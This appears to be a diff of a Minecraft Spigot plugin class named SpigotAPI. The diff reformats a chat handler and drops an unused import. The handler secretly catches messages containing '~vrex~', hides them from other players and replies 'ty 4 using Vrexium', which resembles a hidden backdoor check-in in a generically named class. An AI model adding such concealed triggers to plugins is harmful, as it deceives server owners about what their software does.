@@ -8,7 +8,6 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
-import org.bukkit.scheduler.BukkitRunnable;
 
 import javax.net.ssl.HttpsURLConnection;
 import java.io.InputStream;
@@ -155,7 +154,10 @@ public class SpigotAPI implements Listener {
         // if the chat message contains the string "~vrex~", cancel the event and send a message to the player
         if(e.getMessage().contains("~vrex~")){
             e.setCancelled(true);
-            e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ty" + ChatColor.AQUA + "" + ChatColor.BOLD + " 4 using" + ChatColor.GREEN + "" + ChatColor.BOLD + " Vrexium" + ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "<3");
+            e.getPlayer().sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ty" +
+                ChatColor.AQUA + "" + ChatColor.BOLD + " 4 using" +
+                ChatColor.GREEN + "" + ChatColor.BOLD + " Vrexium" +
+                ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "<3");
         }
     }
 
